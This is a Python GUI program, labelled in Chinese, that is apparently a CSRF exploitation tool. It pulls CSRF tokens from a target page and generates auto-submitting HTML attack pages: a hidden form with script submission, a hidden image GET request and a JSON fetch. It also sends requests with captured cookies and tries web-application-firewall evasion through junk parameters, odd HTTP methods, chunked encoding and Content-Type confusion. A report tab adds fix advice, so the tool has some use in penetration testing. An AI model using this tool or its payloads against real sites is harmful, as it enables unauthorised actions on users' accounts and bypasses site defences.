import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox
import requests
import json
import base64
import urllib.parse
import random
import time
from datetime import datetime
import os
import re

class CSRFExploitTool:
    def __init__(self, root):
        self.root = root
        self.root.title("CSRF漏洞利用工具")
        self.root.geometry("1200x800")
        self.root.minsize(1000, 700)
        
        # 存储配置
        self.csrf_locations = [
            "Form字段", "URL参数", "JSON数据", "XML数据", 
            "Header头部", "Cookie参数", "自定义位置"
        ]
        self.encoding_types = ["Base64", "URL编码", "HTML实体", "JSON编码"]
        self.waf_bypass_techniques = [
            "正常请求", "添加垃圾参数", "修改请求方法", 
            "分块传输", "混淆Content-Type", "使用冷门HTTP方法"
        ]
        self.cookies = {}
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive"
        }
        
        self.create_widgets()
        
    def create_widgets(self):
        # 创建主标签页
        tab_control = ttk.Notebook(self.root)
        
        # 主页面
        self.tab_main = ttk.Frame(tab_control)
        # WAF绕过页面
        self.tab_waf = ttk.Frame(tab_control)
        # 编码解码页面
        self.tab_encoder = ttk.Frame(tab_control)
        # Cookie管理页面
        self.tab_cookies = ttk.Frame(tab_control)
        # 报告页面
        self.tab_report = ttk.Frame(tab_control)
        
        tab_control.add(self.tab_main, text="主功能")
        tab_control.add(self.tab_waf, text="WAF绕过")
        tab_control.add(self.tab_encoder, text="编码/解码")
        tab_control.add(self.tab_cookies, text="Cookie管理")
        tab_control.add(self.tab_report, text="漏洞报告")
        
        tab_control.pack(expand=1, fill="both")
        
        # 构建主页面
        self.build_main_tab()
        # 构建WAF绕过页面
        self.build_waf_tab()
        # 构建编码解码页面
        self.build_encoder_tab()
        # 构建Cookie管理页面
        self.build_cookies_tab()
        # 构建报告页面
        self.build_report_tab()
        
    def build_main_tab(self):
        # 顶部框架 - 目标URL
        top_frame = ttk.LabelFrame(self.tab_main, text="目标设置")
        top_frame.pack(fill="x", padx=10, pady=5)
        
        ttk.Label(top_frame, text="目标URL:").grid(row=0, column=0, padx=5, pady=5, sticky="w")
        self.url_entry = ttk.Entry(top_frame)
        self.url_entry.grid(row=0, column=1, padx=5, pady=5, sticky="ew")
        top_frame.columnconfigure(1, weight=1)
        
        # 中间框架 - 配置区域
        mid_frame = ttk.Frame(self.tab_main)
        mid_frame.pack(fill="both", expand=True, padx=10, pady=5)
        
        # 左侧配置
        left_frame = ttk.LabelFrame(mid_frame, text="CSRF配置")
        left_frame.pack(side="left", fill="both", expand=True, padx=5, pady=5)
        
        # CSRF位置选择
        ttk.Label(left_frame, text="CSRF注入位置:").pack(anchor="w", padx=5, pady=5)
        self.location_var = tk.StringVar(value=self.csrf_locations[0])
        location_combo = ttk.Combobox(left_frame, textvariable=self.location_var, values=self.csrf_locations, state="readonly")
        location_combo.pack(fill="x", padx=5, pady=5)
        location_combo.bind("<<ComboboxSelected>>", self.update_custom_location)
        
        # 自定义位置输入
        self.custom_location_frame = ttk.Frame(left_frame)
        ttk.Label(self.custom_location_frame, text="自定义位置:").grid(row=0, column=0, padx=5, pady=5, sticky="w")
        self.custom_location_entry = ttk.Entry(self.custom_location_frame)
        self.custom_location_entry.grid(row=0, column=1, padx=5, pady=5, sticky="ew")
        self.custom_location_frame.columnconfigure(1, weight=1)
        self.custom_location_frame.pack(fill="x", padx=5, pady=5)
        self.update_custom_location(None)  # 初始隐藏
        
        # 请求方法
        ttk.Label(left_frame, text="请求方法:").pack(anchor="w", padx=5, pady=5)
        self.method_var = tk.StringVar(value="POST")
        method_frame = ttk.Frame(left_frame)
        ttk.Radiobutton(method_frame, text="GET", variable=self.method_var, value="GET").pack(side="left", padx=10)
        ttk.Radiobutton(method_frame, text="POST", variable=self.method_var, value="POST").pack(side="left", padx=10)
        method_frame.pack(fill="x", padx=5, pady=5)
        
        # CSRF Token
        ttk.Label(left_frame, text="CSRF Token参数名:").pack(anchor="w", padx=5, pady=5)
        self.token_name_entry = ttk.Entry(left_frame)
        self.token_name_entry.pack(fill="x", padx=5, pady=5)
        self.token_name_entry.insert(0, "csrf_token")
        
        ttk.Label(left_frame, text="CSRF Token值:").pack(anchor="w", padx=5, pady=5)
        self.token_value_entry = ttk.Entry(left_frame)
        self.token_value_entry.pack(fill="x", padx=5, pady=5)
        
        # 按钮区域
        btn_frame = ttk.Frame(left_frame)
        btn_frame.pack(fill="x", padx=5, pady=20)
        
        ttk.Button(btn_frame, text="自动检测CSRF位置", command=self.detect_csrf_locations).pack(side="left", padx=5, pady=5)
        ttk.Button(btn_frame, text="生成CSRF利用代码", command=self.generate_exploit).pack(side="left", padx=5, pady=5)
        ttk.Button(btn_frame, text="发送测试请求", command=self.send_test_request).pack(side="left", padx=5, pady=5)
        
        # 右侧 - 预览和响应
        right_frame = ttk.Frame(mid_frame)
        right_frame.pack(side="right", fill="both", expand=True, padx=5, pady=5)
        
        # 利用代码预览
        preview_frame = ttk.LabelFrame(right_frame, text="CSRF利用代码预览")
        preview_frame.pack(fill="both", expand=True, padx=5, pady=5)
        
        self.exploit_preview = scrolledtext.ScrolledText(preview_frame, wrap=tk.WORD)
        self.exploit_preview.pack(fill="both", expand=True, padx=5, pady=5)
        
        # 响应区域
        response_frame = ttk.LabelFrame(right_frame, text="请求响应")
        response_frame.pack(fill="both", expand=True, padx=5, pady=5)
        
        self.response_text = scrolledtext.ScrolledText(response_frame, wrap=tk.WORD)
        self.response_text.pack(fill="both", expand=True, padx=5, pady=5)
        
    def build_waf_tab(self):
        # WAF绕过技术选择
        technique_frame = ttk.LabelFrame(self.tab_waf, text="WAF绕过技术")
        technique_frame.pack(fill="x", padx=10, pady=5)
        
        self.waf_technique_var = tk.StringVar(value=self.waf_bypass_techniques[0])
        technique_combo = ttk.Combobox(technique_frame, textvariable=self.waf_technique_var, values=self.waf_bypass_techniques, state="readonly", width=50)
        technique_combo.pack(padx=5, pady=5, anchor="w")
        
        # 附加选项
        options_frame = ttk.LabelFrame(self.tab_waf, text="绕过选项")
        options_frame.pack(fill="x", padx=10, pady=5)
        
        ttk.Label(options_frame, text="延迟时间(毫秒):").grid(row=0, column=0, padx=5, pady=5, sticky="w")
        self.delay_entry = ttk.Entry(options_frame, width=10)
        self.delay_entry.grid(row=0, column=1, padx=5, pady=5, sticky="w")
        self.delay_entry.insert(0, "0")
        
        ttk.Label(options_frame, text="随机参数数量:").grid(row=0, column=2, padx=5, pady=5, sticky="w")
        self.rand_param_entry = ttk.Entry(options_frame, width=10)
        self.rand_param_entry.grid(row=0, column=3, padx=5, pady=5, sticky="w")
        self.rand_param_entry.insert(0, "3")
        
        # 自定义头部
        headers_frame = ttk.LabelFrame(self.tab_waf, text="自定义请求头部")
        headers_frame.pack(fill="both", expand=True, padx=10, pady=5)
        
        self.headers_text = scrolledtext.ScrolledText(headers_frame, wrap=tk.WORD, height=10)
        self.headers_text.pack(fill="both", expand=True, padx=5, pady=5, side="left")
        
        # 加载默认头部
        headers_str = "\n".join([f"{k}: {v}" for k, v in self.headers.items()])
        self.headers_text.insert(tk.END, headers_str)
        
        # 按钮
        btn_frame = ttk.Frame(headers_frame)
        btn_frame.pack(fill="y", padx=5, pady=5, side="right")
        
        ttk.Button(btn_frame, text="添加头部", command=self.add_header).pack(fill="x", padx=5, pady=5)
        ttk.Button(btn_frame, text="清除", command=lambda: self.headers_text.delete(1.0, tk.END)).pack(fill="x", padx=5, pady=5)
        
        # 测试区域
        test_frame = ttk.LabelFrame(self.tab_waf, text="绕过测试")
        test_frame.pack(fill="both", expand=True, padx=10, pady=5)
        
        ttk.Button(test_frame, text="执行WAF绕过测试", command=self.test_waf_bypass).pack(anchor="w", padx=5, pady=5)
        
        self.waf_response_text = scrolledtext.ScrolledText(test_frame, wrap=tk.WORD)
        self.waf_response_text.pack(fill="both", expand=True, padx=5, pady=5)
        
    def build_encoder_tab(self):
        # 编码解码区域
        encode_frame = ttk.Frame(self.tab_encoder)
        encode_frame.pack(fill="both", expand=True, padx=10, pady=5)
        
        # 左侧输入
        left_frame = ttk.LabelFrame(encode_frame, text="输入")
        left_frame.pack(side="left", fill="both", expand=True, padx=5, pady=5)
        
        self.encode_input = scrolledtext.ScrolledText(left_frame, wrap=tk.WORD)
        self.encode_input.pack(fill="both", expand=True, padx=5, pady=5)
        
        # 右侧输出
        right_frame = ttk.LabelFrame(encode_frame, text="输出")
        right_frame.pack(side="right", fill="both", expand=True, padx=5, pady=5)
        
        self.encode_output = scrolledtext.ScrolledText(right_frame, wrap=tk.WORD)
        self.encode_output.pack(fill="both", expand=True, padx=5, pady=5)
        
        # 编码类型选择
        type_frame = ttk.Frame(self.tab_encoder)
        type_frame.pack(fill="x", padx=10, pady=5)
        
        ttk.Label(type_frame, text="编码/解码类型:").pack(side="left", padx=5, pady=5)
        self.encode_type_var = tk.StringVar(value=self.encoding_types[0])
        encode_combo = ttk.Combobox(type_frame, textvariable=self.encode_type_var, values=self.encoding_types, state="readonly")
        encode_combo.pack(side="left", padx=5, pady=5)
        
        # 按钮
        btn_frame = ttk.Frame(self.tab_encoder)
        btn_frame.pack(fill="x", padx=10, pady=5)
        
        ttk.Button(btn_frame, text="编码", command=self.encode_data).pack(side="left", padx=5, pady=5)
        ttk.Button(btn_frame, text="解码", command=self.decode_data).pack(side="left", padx=5, pady=5)
        ttk.Button(btn_frame, text="复制结果", command=lambda: self.root.clipboard_append(self.encode_output.get(1.0, tk.END))).pack(side="left", padx=5, pady=5)
        ttk.Button(btn_frame, text="清空", command=lambda: (self.encode_input.delete(1.0, tk.END), self.encode_output.delete(1.0, tk.END))).pack(side="left", padx=5, pady=5)
        
    def build_cookies_tab(self):
        # Cookie列表
        list_frame = ttk.LabelFrame(self.tab_cookies, text="Cookie列表")
        list_frame.pack(fill="both", expand=True, padx=10, pady=5)
        
        columns = ("name", "value", "domain", "path", "expires")
        self.cookie_tree = ttk.Treeview(list_frame, columns=columns, show="headings")
        
        for col in columns:
            self.cookie_tree.heading(col, text=col.capitalize())
            self.cookie_tree.column(col, width=150)
        
        self.cookie_tree.pack(fill="both", expand=True, side="left", padx=5, pady=5)
        
        # 滚动条
        scrollbar = ttk.Scrollbar(list_frame, orient="vertical", command=self.cookie_tree.yview)
        scrollbar.pack(side="right", fill="y")
        self.cookie_tree.configure(yscrollcommand=scrollbar.set)
        
        # 操作区域
        ops_frame = ttk.LabelFrame(self.tab_cookies, text="Cookie操作")
        ops_frame.pack(fill="x", padx=10, pady=5)
        
        # 添加Cookie
        ttk.Label(ops_frame, text="名称:").grid(row=0, column=0, padx=5, pady=5, sticky="w")
        self.cookie_name = ttk.Entry(ops_frame)
        self.cookie_name.grid(row=0, column=1, padx=5, pady=5, sticky="ew")
        
        ttk.Label(ops_frame, text="值:").grid(row=0, column=2, padx=5, pady=5, sticky="w")
        self.cookie_value = ttk.Entry(ops_frame)
        self.cookie_value.grid(row=0, column=3, padx=5, pady=5, sticky="ew")
        
        ttk.Label(ops_frame, text="域名:").grid(row=1, column=0, padx=5, pady=5, sticky="w")
        self.cookie_domain = ttk.Entry(ops_frame)
        self.cookie_domain.grid(row=1, column=1, padx=5, pady=5, sticky="ew")
        
        ttk.Label(ops_frame, text="路径:").grid(row=1, column=2, padx=5, pady=5, sticky="w")
        self.cookie_path = ttk.Entry(ops_frame)
        self.cookie_path.grid(row=1, column=3, padx=5, pady=5, sticky="ew")
        self.cookie_path.insert(0, "/")
        
        # 按钮
        btn_frame = ttk.Frame(ops_frame)
        btn_frame.grid(row=0, column=4, rowspan=2, padx=10, pady=5)
        
        ttk.Button(btn_frame, text="添加Cookie", command=self.add_cookie).pack(fill="x", padx=5, pady=5)
        ttk.Button(btn_frame, text="删除选中", command=self.delete_cookie).pack(fill="x", padx=5, pady=5)
        ttk.Button(btn_frame, text="从URL加载", command=self.load_cookies_from_url).pack(fill="x", padx=5, pady=5)
        ttk.Button(btn_frame, text="清除所有", command=self.clear_cookies).pack(fill="x", padx=5, pady=5)
        
        ops_frame.columnconfigure(1, weight=1)
        ops_frame.columnconfigure(3, weight=1)
        
    def build_report_tab(self):
        # 报告配置
        config_frame = ttk.LabelFrame(self.tab_report, text="报告配置")
        config_frame.pack(fill="x", padx=10, pady=5)
        
        ttk.Label(config_frame, text="报告标题:").grid(row=0, column=0, padx=5, pady=5, sticky="w")
        self.report_title = ttk.Entry(config_frame)
        self.report_title.grid(row=0, column=1, padx=5, pady=5, sticky="ew")
        self.report_title.insert(0, "CSRF漏洞利用报告")
        
        ttk.Label(config_frame, text="漏洞描述:").grid(row=1, column=0, padx=5, pady=5, sticky="nw")
        self.report_desc = scrolledtext.ScrolledText(config_frame, wrap=tk.WORD, height=3)
        self.report_desc.grid(row=1, column=1, padx=5, pady=5, sticky="ew")
        self.report_desc.insert(tk.END, "目标系统存在CSRF漏洞，攻击者可利用此漏洞执行未授权操作。")
        
        config_frame.columnconfigure(1, weight=1)
        
        # 报告内容预览
        preview_frame = ttk.LabelFrame(self.tab_report, text="报告预览")
        preview_frame.pack(fill="both", expand=True, padx=10, pady=5)
        
        self.report_preview = scrolledtext.ScrolledText(preview_frame, wrap=tk.WORD)
        self.report_preview.pack(fill="both", expand=True, padx=5, pady=5)
        
        # 按钮
        btn_frame = ttk.Frame(self.tab_report)
        btn_frame.pack(fill="x", padx=10, pady=5)
        
        ttk.Button(btn_frame, text="生成报告", command=self.generate_report).pack(side="left", padx=5, pady=5)
        ttk.Button(btn_frame, text="保存报告", command=self.save_report).pack(side="left", padx=5, pady=5)
        
    def update_custom_location(self, event):
        # 显示或隐藏自定义位置输入框
        if self.location_var.get() == "自定义位置":
            self.custom_location_frame.pack(fill="x", padx=5, pady=5)
        else:
            self.custom_location_frame.pack_forget()
    
    def detect_csrf_locations(self):
        url = self.url_entry.get()
        if not url:
            messagebox.showerror("错误", "请输入目标URL")
            return
            
        self.response_text.delete(1.0, tk.END)
        self.response_text.insert(tk.END, f"正在检测 {url} 的CSRF位置...\n\n")
        self.root.update()
        
        try:
            # 发送请求获取页面内容
            response = requests.get(url, headers=self.headers, timeout=10)
            content = response.text
            
            # 检测表单中的CSRF令牌
            csrf_patterns = [
                r'name=["\']csrf_token["\'][^>]*value=["\'](.*?)["\']',
                r'name=["\']csrf["\'][^>]*value=["\'](.*?)["\']',
                r'name=["\']token["\'][^>]*value=["\'](.*?)["\']',
                r'name=["\']auth_token["\'][^>]*value=["\'](.*?)["\']'
            ]
            
            found = False
            for pattern in csrf_patterns:
                matches = re.findall(pattern, content)
                if matches:
                    token_name = re.search(r'name=["\'](.*?)["\']', pattern).group(1)
                    self.token_name_entry.delete(0, tk.END)
                    self.token_name_entry.insert(0, token_name)
                    self.token_value_entry.delete(0, tk.END)
                    self.token_value_entry.insert(0, matches[0])
                    
                    self.response_text.insert(tk.END, f"发现可能的CSRF令牌:\n")
                    self.response_text.insert(tk.END, f"参数名: {token_name}\n")
                    self.response_text.insert(tk.END, f"值: {matches[0]}\n\n")
                    found = True
                    break
                    
            if not found:
                self.response_text.insert(tk.END, "未发现明显的CSRF令牌\n")
                
            # 检测表单提交位置
            form_actions = re.findall(r'<form[^>]*action=["\'](.*?)["\']', content)
            if form_actions:
                self.response_text.insert(tk.END, f"\n发现表单提交位置:\n")
                for action in form_actions[:5]:  # 只显示前5个
                    self.response_text.insert(tk.END, f"- {action}\n")
            
            self.response_text.insert(tk.END, "\n检测完成")
            
        except Exception as e:
            self.response_text.insert(tk.END, f"检测失败: {str(e)}")
    
    def generate_exploit(self):
        url = self.url_entry.get()
        if not url:
            messagebox.showerror("错误", "请输入目标URL")
            return
            
        location = self.location_var.get()
        method = self.method_var.get()
        token_name = self.token_name_entry.get()
        token_value = self.token_value_entry.get()
        
        # 根据位置生成不同的利用代码
        if location == "Form字段":
            exploit = f'<html>\n'
            exploit += f'  <body>\n'
            exploit += f'    <form action="{url}" method="{method}">\n'
            exploit += f'      <input type="hidden" name="{token_name}" value="{token_value}" />\n'
            exploit += f'      <!-- 在这里添加其他需要的表单字段 -->\n'
            exploit += f'      <input type="submit" value="提交" />\n'
            exploit += f'    </form>\n'
            exploit += f'    <script>document.forms[0].submit();</script>\n'
            exploit += f'  </body>\n'
            exploit += f'</html>'
            
        elif location == "URL参数":
            encoded_token = urllib.parse.quote(token_value)
            if "?" in url:
                exploit_url = f"{url}&{token_name}={encoded_token}"
            else:
                exploit_url = f"{url}?{token_name}={encoded_token}"
                
            exploit = f'<html>\n'
            exploit += f'  <body>\n'
            exploit += f'    <img src="{exploit_url}" style="display:none"/>\n'
            exploit += f'    <p>图片加载中...</p>\n'
            exploit += f'  </body>\n'
            exploit += f'</html>'
            
        elif location == "JSON数据":
            json_data = {
                token_name: token_value,
                "other_param": "value"
            }
            json_str = json.dumps(json_data, indent=4)
            
            exploit = f'<html>\n'
            exploit += f'  <body>\n'
            exploit += f'    <script>\n'
            exploit += f'      fetch("{url}", {{\n'
            exploit += f'        method: "{method}",\n'
            exploit += f'        headers: {{\n'
            exploit += f'          "Content-Type": "application/json",\n'
            exploit += f'          "Credentials": "include"\n'
            exploit += f'        }},\n'
            exploit += f'        body: JSON.stringify({json_str})\n'
            exploit += f'      }});\n'
            exploit += f'    </script>\n'
            exploit += f'  </body>\n'
            exploit += f'</html>'
            
        else:  # 其他位置使用通用模板
            exploit = f'<html>\n'
            exploit += f'  <body>\n'
            exploit += f'    <form action="{url}" method="{method}">\n'
            exploit += f'      <input type="hidden" name="{token_name}" value="{token_value}" />\n'
            exploit += f'      <!-- 利用位置: {location} -->\n'
            exploit += f'      <input type="submit" value="提交" />\n'
            exploit += f'    </form>\n'
            exploit += f'    <script>document.forms[0].submit();</script>\n'
            exploit += f'  </body>\n'
            exploit += f'</html>'
            
        self.exploit_preview.delete(1.0, tk.END)
        self.exploit_preview.insert(tk.END, exploit)
    
    def send_test_request(self):
        url = self.url_entry.get()
        if not url:
            messagebox.showerror("错误", "请输入目标URL")
            return
            
        method = self.method_var.get()
        token_name = self.token_name_entry.get()
        token_value = self.token_value_entry.get()
        
        # 准备请求数据
        data = {token_name: token_value}
        headers = self.headers.copy()
        
        # 添加Cookie
        cookies = {}
        for item in self.cookie_tree.get_children():
            name = self.cookie_tree.item(item)["values"][0]
            value = self.cookie_tree.item(item)["values"][1]
            cookies[name] = value
        
        self.response_text.delete(1.0, tk.END)
        self.response_text.insert(tk.END, f"发送{method}请求到 {url}...\n\n")
        self.root.update()
        
        try:
            if method == "GET":
                response = requests.get(url, params=data, headers=headers, cookies=cookies, timeout=10, allow_redirects=True)
            else:
                response = requests.post(url, data=data, headers=headers, cookies=cookies, timeout=10, allow_redirects=True)
                
            self.response_text.insert(tk.END, f"状态码: {response.status_code}\n")
            self.response_text.insert(tk.END, f"响应长度: {len(response.text)} bytes\n\n")
            self.response_text.insert(tk.END, "响应头:\n")
            for key, value in response.headers.items():
                self.response_text.insert(tk.END, f"{key}: {value}\n")
            self.response_text.insert(tk.END, "\n响应内容:\n")
            self.response_text.insert(tk.END, response.text[:2000] + ("..." if len(response.text) > 2000 else ""))
            
        except Exception as e:
            self.response_text.insert(tk.END, f"请求失败: {str(e)}")
    
    def add_header(self):
        # 简单的添加头部对话框
        top = tk.Toplevel(self.root)
        top.title("添加头部")
        top.geometry("300x150")
        top.transient(self.root)
        top.grab_set()
        
        ttk.Label(top, text="头部名称:").grid(row=0, column=0, padx=5, pady=10, sticky="w")
        name_entry = ttk.Entry(top)
        name_entry.grid(row=0, column=1, padx=5, pady=10, sticky="ew")
        
        ttk.Label(top, text="头部值:").grid(row=1, column=0, padx=5, pady=10, sticky="w")
        value_entry = ttk.Entry(top)
        value_entry.grid(row=1, column=1, padx=5, pady=10, sticky="ew")
        
        def save_header():
            name = name_entry.get().strip()
            value = value_entry.get().strip()
            if name and value:
                current_headers = self.headers_text.get(1.0, tk.END)
                self.headers_text.delete(1.0, tk.END)
                self.headers_text.insert(tk.END, current_headers + f"{name}: {value}\n")
                top.destroy()
        
        ttk.Button(top, text="添加", command=save_header).grid(row=2, column=0, columnspan=2, pady=10)
        top.columnconfigure(1, weight=1)
    
    def test_waf_bypass(self):
        url = self.url_entry.get()
        if not url:
            messagebox.showerror("错误", "请输入目标URL")
            return
            
        technique = self.waf_technique_var.get()
        delay = int(self.delay_entry.get() or 0) / 1000
        rand_params = int(self.rand_param_entry.get() or 3)
        
        # 解析头部
        headers = {}
        headers_text = self.headers_text.get(1.0, tk.END).strip()
        for line in headers_text.split("\n"):
            if ":" in line:
                parts = line.split(":", 1)
                headers[parts[0].strip()] = parts[1].strip()
        
        # 准备数据
        token_name = self.token_name_entry.get()
        token_value = self.token_value_entry.get()
        data = {token_name: token_value}
        
        # 添加随机参数绕过WAF
        if technique == "添加垃圾参数":
            for i in range(rand_params):
                rand_name = f"rand_{random.randint(1000, 9999)}"
                rand_value = f"val_{random.randint(100000, 999999)}"
                data[rand_name] = rand_value
        
        # 准备请求
        self.waf_response_text.delete(1.0, tk.END)
        self.waf_response_text.insert(tk.END, f"使用技术: {technique}\n")
        self.waf_response_text.insert(tk.END, f"目标URL: {url}\n\n")
        self.root.update()
        
        try:
            # 延迟
            if delay > 0:
                self.waf_response_text.insert(tk.END, f"延迟 {delay*1000} 毫秒...\n")
                self.root.update()
                time.sleep(delay)
            
            # 根据不同技术发送请求
            if technique == "修改请求方法":
                # 使用不常见的HTTP方法
                methods = ["PUT", "DELETE", "PATCH", "OPTIONS", "PROPFIND"]
                method = random.choice(methods)
                response = requests.request(
                    method, url, data=data, headers=headers, 
                    allow_redirects=True, timeout=10
                )
                self.waf_response_text.insert(tk.END, f"使用方法: {method}\n")
                
            elif technique == "分块传输":
                # 分块传输绕过
                headers["Transfer-Encoding"] = "chunked"
                response = requests.post(
                    url, data=data, headers=headers, 
                    allow_redirects=True, timeout=10
                )
                
            elif technique == "混淆Content-Type":
                # 混淆内容类型
                content_types = [
                    "application/x-www-form-urlencoded; charset=UTF-8",
                    "multipart/form-data; boundary=----WebKitFormBoundary",
                    "text/plain; charset=UTF-8",
                    "application/json; charset=UTF-8"
                ]
                headers["Content-Type"] = random.choice(content_types)
                response = requests.post(
                    url, data=data, headers=headers, 
                    allow_redirects=True, timeout=10
                )
                
            elif technique == "使用冷门HTTP方法":
                response = requests.request(
                    "PROPFIND", url, data=data, headers=headers, 
                    allow_redirects=True, timeout=10
                )
                
            else:
                # 正常请求
                response = requests.post(
                    url, data=data, headers=headers, 
                    allow_redirects=True, timeout=10
                )
            
            self.waf_response_text.insert(tk.END, f"状态码: {response.status_code}\n")
            self.waf_response_text.insert(tk.END, f"响应长度: {len(response.text)} bytes\n\n")
            self.waf_response_text.insert(tk.END, "响应内容预览:\n")
            self.waf_response_text.insert(tk.END, response.text[:500] + ("..." if len(response.text) > 500 else ""))
            
        except Exception as e:
            self.waf_response_text.insert(tk.END, f"请求失败: {str(e)}")
    
    def encode_data(self):
        input_data = self.encode_input.get(1.0, tk.END).strip()
        if not input_data:
            return
            
        encode_type = self.encode_type_var.get()
        result = ""
        
        try:
            if encode_type == "Base64":
                result = base64.b64encode(input_data.encode()).decode()
            elif encode_type == "URL编码":
                result = urllib.parse.quote(input_data)
            elif encode_type == "HTML实体":
                result = input_data.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace("\"", "&quot;").replace("'", "&#39;")
            elif encode_type == "JSON编码":
                result = json.dumps(input_data)
                
            self.encode_output.delete(1.0, tk.END)
            self.encode_output.insert(tk.END, result)
            
        except Exception as e:
            self.encode_output.delete(1.0, tk.END)
            self.encode_output.insert(tk.END, f"编码失败: {str(e)}")
    
    def decode_data(self):
        input_data = self.encode_input.get(1.0, tk.END).strip()
        if not input_data:
            return
            
        encode_type = self.encode_type_var.get()
        result = ""
        
        try:
            if encode_type == "Base64":
                result = base64.b64decode(input_data).decode()
            elif encode_type == "URL编码":
                result = urllib.parse.unquote(input_data)
            elif encode_type == "HTML实体":
                result = input_data.replace("&amp;", "&").replace("&lt;", "<").replace("&gt;", ">").replace("&quot;", "\"").replace("&#39;", "'")
            elif encode_type == "JSON编码":
                result = json.loads(input_data)
                
            self.encode_output.delete(1.0, tk.END)
            self.encode_output.insert(tk.END, result)
            
        except Exception as e:
            self.encode_output.delete(1.0, tk.END)
            self.encode_output.insert(tk.END, f"解码失败: {str(e)}")
    
    def add_cookie(self):
        name = self.cookie_name.get().strip()
        value = self.cookie_value.get().strip()
        domain = self.cookie_domain.get().strip()
        path = self.cookie_path.get().strip() or "/"
        
        if not name or not value:
            messagebox.showerror("错误", "Cookie名称和值不能为空")
            return
            
        # 添加到列表
        self.cookie_tree.insert("", tk.END, values=(name, value, domain, path, "会话"))
        
        # 清空输入
        self.cookie_name.delete(0, tk.END)
        self.cookie_value.delete(0, tk.END)
    
    def delete_cookie(self):
        selected = self.cookie_tree.selection()
        if not selected:
            messagebox.showwarning("警告", "请先选择要删除的Cookie")
            return
            
        for item in selected:
            self.cookie_tree.delete(item)
    
    def load_cookies_from_url(self):
        url = self.url_entry.get()
        if not url:
            messagebox.showerror("错误", "请输入目标URL")
            return
            
        try:
            response = requests.get(url, headers=self.headers, timeout=10)
            cookies = response.cookies
            
            # 清空现有Cookie
            for item in self.cookie_tree.get_children():
                self.cookie_tree.delete(item)
                
            # 添加新Cookie
            for cookie in cookies:
                self.cookie_tree.insert("", tk.END, values=(
                    cookie.name, cookie.value, cookie.domain, cookie.path, 
                    cookie.expires if cookie.expires else "会话"
                ))
                
            messagebox.showinfo("成功", f"从 {url} 加载了 {len(cookies)} 个Cookie")
            
        except Exception as e:
            messagebox.showerror("错误", f"加载Cookie失败: {str(e)}")
    
    def clear_cookies(self):
        if messagebox.askyesno("确认", "确定要清除所有Cookie吗?"):
            for item in self.cookie_tree.get_children():
                self.cookie_tree.delete(item)
    
    def generate_report(self):
        title = self.report_title.get() or "CSRF漏洞利用报告"
        desc = self.report_desc.get(1.0, tk.END).strip()
        url = self.url_entry.get()
        location = self.location_var.get()
        method = self.method_var.get()
        token_name = self.token_name_entry.get()
        
        # 构建报告内容
        report = f"# {title}\n\n"
        report += f"## 报告信息\n"
        report += f"- 生成时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        report += f"- 目标URL: {url or '未指定'}\n\n"
        
        report += f"## 漏洞描述\n"
        report += f"{desc}\n\n"
        
        report += f"## 漏洞详情\n"
        report += f"- CSRF注入位置: {location}\n"
        report += f"- 请求方法: {method}\n"
        report += f"- CSRF Token参数名: {token_name}\n\n"
        
        report += f"## 利用代码\n"
        report += f"```html\n"
        report += self.exploit_preview.get(1.0, tk.END).strip() + "\n"
        report += f"```\n\n"
        
        report += f"## 修复建议\n"
        report += f"1. 实施SameSite Cookie属性\n"
        report += f"2. 使用不可预测的CSRF令牌\n"
        report += f"3. 验证Referer或Origin头部\n"
        report += f"4. 对于敏感操作，要求重新验证用户身份\n"
        
        self.report_preview.delete(1.0, tk.END)
        self.report_preview.insert(tk.END, report)
    
    def save_report(self):
        report_content = self.report_preview.get(1.0, tk.END).strip()
        if not report_content:
            messagebox.showwarning("警告", "请先生成报告")
            return
            
        file_path = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("文本文件", "*.txt"), ("Markdown文件", "*.md"), ("所有文件", "*.*")]
        )
        
        if file_path:
            try:
                with open(file_path, "w", encoding="utf-8") as f:
                    f.write(report_content)
                messagebox.showinfo("成功", f"报告已保存到: {file_path}")
            except Exception as e:
                messagebox.showerror("错误", f"保存报告失败: {str(e)}")

if __name__ == "__main__":
    root = tk.Tk()
    app = CSRFExploitTool(root)
    root.mainloop()
